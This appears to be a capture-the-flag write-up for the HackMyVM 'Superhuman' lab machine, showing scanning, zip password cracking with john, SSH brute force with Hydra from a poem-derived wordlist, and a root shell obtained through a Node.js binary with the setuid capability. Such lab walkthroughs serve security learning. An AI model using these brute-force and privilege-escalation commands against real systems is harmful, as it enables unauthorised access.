# Superhuman Writeup HackMyVM

![superhuman](https://github.com/0xsynix/Writeups/blob/main/assets/HackMyVM/Superhuman/superhuman.png)

<strong> Superhuman is an easy level Linux box from HackMyVM platfrom! <a href="https://hackmyvm.eu/machines/machine.php?vm=Superhuman"> VM Link </a> </strong>

<br>

## Enumeration

#### >> Starting with by finding ip addresss of target with `netdiscover`
```shell                                                                                                                                                                                                                   
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                             
 3 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 14520
_____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
-----------------------------------------------------------------------------
 192.168.0.1     34:0a:33:79:d5:fe    211   12660  D-Link International                                                                                                                                                                     
 192.168.0.133   28:39:26:3a:31:3f      1      60  CyberTAN Technology Inc.                                                                                                                                                                 
 192.168.0.140   08:00:27:53:d9:c1      1      60  PCS Systemtechnik GmbH
```
- Our Target ip is 192.168.0.140

#### >> Scan for open Ports and services with `nmap`
```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV  192.168.0.140 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 04:49 EDT
Nmap scan report for 192.168.0.140
Host is up (0.0012s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9e:41:5a:43:d8:b3:31:18:0f:2e:32:36:cf:68:c4:b7 (RSA)
|   256 6f:24:81:b4:3d:e5:b9:c8:47:bf:b2:8b:bf:41:2d:51 (ECDSA)
|_  256 49:5f:c0:7a:42:20:76:76:d5:29:1a:65:bf:87:d2:24 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:53:D9:C1 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.60 seconds
```
- Found nothing intresting!
- On visiting Website also found nothing just blank page!

#### >> Let's Run `ctfenum` script
```shell
┌──(kali㉿kali)-[~]
└─$ ctfenum 192.168.0.140                                                        

╔─────────────────────────────────────────────────────────────────────╗
│  ██████╗████████╗███████╗    ███████╗███╗   ██╗██╗   ██╗███╗   ███╗ │
│ ██╔════╝╚══██╔══╝██╔════╝    ██╔════╝████╗  ██║██║   ██║████╗ ████║ │
│ ██║        ██║   █████╗      █████╗  ██╔██╗ ██║██║   ██║██╔████╔██║ │
│ ██║        ██║   ██╔══╝      ██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║ │
│ ╚██████╗   ██║   ██║         ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║ │
│  ╚═════╝   ╚═╝   ╚═╝         ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝ │
╚─────────────────────────────────────────────────────────────────────╝

[!] Version: 1.0.0
======================================================================
[!] Checking open ports
======================================================================
OPEN TCP PORTS:
[!] nmap -Pn -T3 -n -p- 192.168.0.140
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:53:D9:C1 (Oracle VirtualBox virtual NIC)
======================================================================
[!] Generating Nmap output
======================================================================
NMAP TCP OUTPUT:
[!] nmap -T5 -n -Pn -sCV -p22,80 192.168.0.140
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9e:41:5a:43:d8:b3:31:18:0f:2e:32:36:cf:68:c4:b7 (RSA)
|   256 6f:24:81:b4:3d:e5:b9:c8:47:bf:b2:8b:bf:41:2d:51 (ECDSA)
|_  256 49:5f:c0:7a:42:20:76:76:d5:29:1a:65:bf:87:d2:24 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:53:D9:C1 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
======================================================================
[!] Attacking port 22
[!] SSH
[!] You can try to bruteforce credentials using [netexec|crackmapexec|hydra].
netexec ssh $(IP) -u usernames.txt -p passwords.txt | grep -E '\[\+\]|\[\*\]'
======================================================================
[!] Attacking port 80
[!] Apache server, Fuzzing for PHP files.
[+] Apache/2.4.38 (Debian)
[!] URL: http://192.168.0.140:80
[!] feroxbuster -u http://192.168.0.140:80 -w /opt/CTFEnum/CTFenum/mods/wordlist.txt -x html,txt,php -t 100 --no-state --extract-links -C 400,401,403,404,501,502,503 -r -k -E -g -d 1 --silent

http://192.168.0.140/
http://192.168.0.140/index.html
http://192.168.0.140/?wsdl
http://192.168.0.140/?wsdl.html
http://192.168.0.140/?wsdl.txt

[!] Comments found:
<!-- If your eye was sharper, you would see everything in motion, lol -->
```

- Found an intresting comment on web page!

#### >> Bruteforce directories and files with `gobuster`
```shell
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.0.140 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.38
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
2023/04/28 22:12:36 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 274]
/notes-tips.txt       (Status: 200) [Size: 358]
Progress: 2538662 / 2547668 (99.65%)
===============================================================
Finished
===============================================================
```
- Found an intresting file `notes-tips.txt`
- By visting the file we'll found this

```shell
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.0.140/notes-tips.txt                                                                              
F(&m'D.Oi#De4!--ZgJT@;^00D.P7@8LJ?tF)N1B@:UuC/g+jUD'3nBEb-A+De'u)F!,")@:UuC/g(Km+CoM$DJL@Q+Dbb6ATDi7De:+g@<HBpDImi@/hSb!FDl(?A9)g1CERG3Cb?i%-Z!TAGB.D>AKYYtEZed5E,T<)+CT.u+EM4--Z!TAA7]grEb-A1AM,)s-Z!TADIIBn+DGp?F(&m'D.R'_DId*=59NN?A8c?5F<G@:Dg*f@$:u@WF`VXIDJsV>AoD^&ATT&:D]j+0G%De1F<G"0A0>i6F<G!7B5_^!+D#e>ASuR'Df-\,ARf.kF(HIc+CoD.-ZgJE@<Q3)D09?%+EMXCEa`Tl/c
```

#### >> Try to decrypt this string

![1](https://github.com/0xsynix/Writeups/blob/main/assets/HackMyVM/Superhuman/1.png)

- Its an Base85 encoded strings
- We'll get the message from there and get some hints!
- Like he'll write a poem for her and name it as salome_and_??
- And save it with a good extension because there is no space left
- So its maybe extension like zip, 7z, RAR
<br>

#### >> After a while figured out the file is salome_and_me and the extension is .zip
- So the file is  `salome_and_me.zip` 
```shell
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.0.140/salome_and_me.zip      
```
- By visitng this we'll get the password protected zip file!

```shell
 ┌──(kali㉿kali)-[~/Downloads]
└─$ zip2john salome_and_me.zip > hash
Created directory: /home/kali/.john
ver 2.0 efh 5455 efh 7875 salome_and_me.zip/salome_and_me.txt PKZIP Encr: TS_chk, cmplen=252, decmplen=443, crc=91CF0992 ts=393B cs=393b type=8
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Downloads]
└─$ john hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
turtle           (salome_and_me.zip/salome_and_me.txt)     
1g 0:00:00:00 DONE 2/3 (2024-09-03 05:22) 5.555g/s 345450p/s 345450c/s 345450C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- We get password lets extract the zip file

```shell
┌──(kali㉿kali)-[~/Downloads]
└─$ cat salome_and_me.txt 

----------------------------------------------------

	     GREAT POEM FOR SALOME

----------------------------------------------------


My name is fred,
And tonight I'm sad, lonely and scared,
Because my love Salome prefers schopenhauer, asshole,
I hate him he's stupid, ugly and a peephole,
My darling I offered you a great switch,
And now you reject my love, bitch
I don't give a fuck, I'll go with another lady,
And she'll call me BABY!
```

- Intresting, we found the poem!!

<br>

## Exploitation

#### >> Create wordlist from the poem
```shell
┌──(kali㉿kali)-[~]
└─$ cat pass.txt 
fred
lonely
scared
love
salome
schopenhauer
asshole
ugly
stupid
peephole
switch
love
bitch
fuck
BABY
```

#### >> Brute Force SSH with this creds
```shell
┌──(kali㉿kali)-[~]
└─$ hydra -l fred -P pass.txt 192.168.0.140 ssh -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-03 05:30:11
[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:1/p:15), ~4 tries per task
[DATA] attacking ssh://192.168.0.140:22/
[22][ssh] host: 192.168.0.140   login: fred   password: schopenhauer
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-03 05:30:16
```

- And boom we got the access to machine!

```shell

┌──(kali㉿kali)-[~]
└─$ ssh fred@192.168.0.140          
The authenticity of host '192.168.0.140 (192.168.0.140)' can't be established.
ED25519 key fingerprint is SHA256:uMQFM7I4Jh7Aalpln+uDJju+nTUifr7VU8OTI1+E7Uc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.140' (ED25519) to the list of known hosts.
fred@192.168.0.140's password: 
Linux superhuman 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Apr  1 03:36:39 2021 from 192.168.0.28
fred@superhuman:~$ whoami
fred
fred@superhuman:~$ id
uid=1000(fred) gid=1000(fred) groups=1000(fred),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
fred@superhuman:~$ ls
lol
Connection to 192.168.0.140 closed.
```

- If we try to run `ls` the connection will be terminated! 🙂

#### >> Try to find the user flag
```shell

┌──(kali㉿kali)-[~]
└─$ ssh fred@192.168.0.140
fred@192.168.0.140's password: 
Linux superhuman 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Sep  3 05:31:23 2024 from 192.168.0.137
fred@superhuman:~$ find / -name user* 2>/dev/null
/home/fred/user.txt
```
 - And we found the user flag!!! 👽
<br>

## Privilege escalation
```shell
fred@superhuman:~$ find / -name user* 2>/dev/null
/home/fred/user.txt
fred@superhuman:~$ sudo -l
-bash: sudo: command not found
fred@superhuman:~$ find / -type f -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/su
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/umount
/usr/bin/chfn
```
- looking around a bit but no luck! 🙁
- look for ways to escalate privileges and found out about file capabilities
- Found a file with capabilities permissions.

```shell
fred@superhuman:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/node = cap_setuid+ep
```

#### >> Look at <a href="https://gtfobins.github.io/gtfobins/node/"> GTFObins </a> for file capabilities

![GTFObins](https://github.com/0xsynix/Writeups/blob/main/assets/HackMyVM/Superhuman/2.png)

- And found a way to escalate privileges
```shell
fred@superhuman:~$ /usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
# whoami
root
# id
uid=0(root) gid=1000(fred) groups=1000(fred),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

- And BOOM 💥 we got the ROOT shell!!
- Don't try to run `ls` it will terminate the shell! 🙂

```shell
# cd /root
# find / -name root* 2>/dev/null
/root/root.txt
# 
```

- And that's how we got the root flag!!! 👾
